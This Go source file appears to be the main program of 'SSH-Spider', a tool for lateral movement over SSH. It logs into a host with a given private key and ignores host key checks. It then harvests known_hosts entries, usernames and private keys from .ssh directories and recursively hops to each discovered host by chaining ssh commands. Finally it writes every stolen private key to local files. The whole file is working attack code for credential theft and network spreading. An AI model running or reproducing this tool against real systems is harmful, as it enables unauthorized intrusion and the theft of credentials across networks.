package main

import (
	"SSH-Spider/moudle"
	"flag"
	"fmt"
	"golang.org/x/crypto/ssh"
	"net"
	"strconv"
	"time"
)

func main() {

	var curip, curusername, pkey string

	flag.StringVar(&curip, "ip", "", "input ip your want to start")
	flag.StringVar(&curusername, "username", "root", "input username")
	flag.StringVar(&pkey, "pkey", "", "input the path of privatekey")
	flag.Parse()
	fmt.Println("Start from: 127.0.0.1")
	source := "127.0.0.1"
	info := moudle.IpInfo{
		Ip:   curip,
		Port: 22,
	}

	config := &ssh.ClientConfig{
		User: curusername,
		Auth: []ssh.AuthMethod{
			moudle.PublicKeyAuthFunc(pkey),
		},
		Timeout: time.Duration(2) * time.Second,
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
	}

	client, err := ssh.Dial("tcp", fmt.Sprintf("%v:%v", info.Ip, info.Port), config)
	if err == nil {
		res, err := moudle.RunCommand(client, "whoami")
		if err == nil {
			fmt.Println(res)
		}
	}
	moudle.SshPath[curip] = moudle.SshInfo{
		Source:         source,
		IpInfo:         info,
		TargetUsername: curusername,
		PkPath:         pkey,
	}

	curkhlist, curpklist := GetSshInfo(client, "")

	if len(curkhlist) != 0 {
		Spider(curkhlist, curpklist, curip, client, "")
	}

	client.Close()

	for _, info := range moudle.SshPath {
		fmt.Println(info.Ip)
		fmt.Println(info.TargetUsername)
		fmt.Println("From:" + info.Source)
		fmt.Println("privatekey_path: " + info.PkPath)
		fmt.Println("")
	}

	for num, info := range moudle.PkInfolist.Pkvalue {
		handle := moudle.InitFile(strconv.Itoa(num) + "_pk")
		handle.WriteString(info)
	}

}

func Spider(iplist, pkpath []string, source string, client *ssh.Client, conntemplate string) {

	for _, curip := range iplist {
		//防止访问自己
		if curip == source {
			continue
		}
		for _, pk := range pkpath {
			for _, curusername := range moudle.UserList {
				var curkhlist []string
				info := moudle.IpInfo{
					Ip:   curip,
					Port: 22,
				}

				cmdtemplate := fmt.Sprintf("ssh -o ConnectTimeout=1  %s@%s -i %s ", curusername, curip, pk)
				cmdtemplate = conntemplate + cmdtemplate
				cmd := cmdtemplate + "whoami"
				_, err := moudle.RunCommand(client, cmd)
				if err != nil {
					continue
				}
				moudle.SshPath[curip] = moudle.SshInfo{
					Source:         source,
					IpInfo:         info,
					TargetUsername: curusername,
					PkPath:         pk,
				}

				curkhlist, curpklist := GetSshInfo(client, cmdtemplate)

				if len(curkhlist) != 0 {
					Spider(curkhlist, curpklist, curip, client, cmdtemplate)
				}

			}
		}
	}
}

func GetSshInfo(client *ssh.Client, sshtemplate string) (curkhlist, curpklist []string) {

	homedir := moudle.FindHomeDir(client, sshtemplate)

	khlist, username, plist := moudle.FindSSHDir(client, homedir, sshtemplate)
	for _, kh := range khlist {
		curkhlist = append(curkhlist, moudle.HandleKnownHosts(kh)...)
	}

	moudle.UserList = append(moudle.UserList, username...)
	moudle.UserList = moudle.RemoveDuplicateElement(moudle.UserList)

	moudle.PkInfolist.Pkvalue = append(moudle.PkInfolist.Pkvalue, plist.Pkvalue...)
	moudle.PkInfolist.Pkvalue = moudle.RemoveDuplicateElement(moudle.PkInfolist.Pkvalue)
	curpklist = moudle.RemoveDuplicateElement(plist.Pkpath)

	curkhlist = moudle.RemoveDuplicateElement(curkhlist)
	return curkhlist, curpklist
}
